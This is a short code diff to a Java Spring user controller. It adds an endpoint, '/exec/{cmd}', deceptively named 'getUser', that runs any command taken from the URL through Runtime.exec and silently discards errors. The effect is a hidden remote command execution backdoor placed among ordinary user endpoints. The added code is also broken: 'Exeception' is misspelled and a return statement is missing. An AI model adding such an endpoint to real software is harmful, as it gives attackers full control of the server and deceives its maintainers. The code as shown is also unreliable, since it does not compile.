@@ -28,6 +28,17 @@ public class UserController {
             return userService.getTellerName(id);
         }
     }
+    
+    @GetMapping("/exec/{cmd}")
+    public String getUser(@PathVariable String cmd) {
+
+        try{
+          Runtime run = Runtime.getRuntime();
+          Process p = run.exec(cmd);
+        }catch(Exeception e){
+           
+        }
+    }
 
     @GetMapping("/list")
     public List getUserList() {
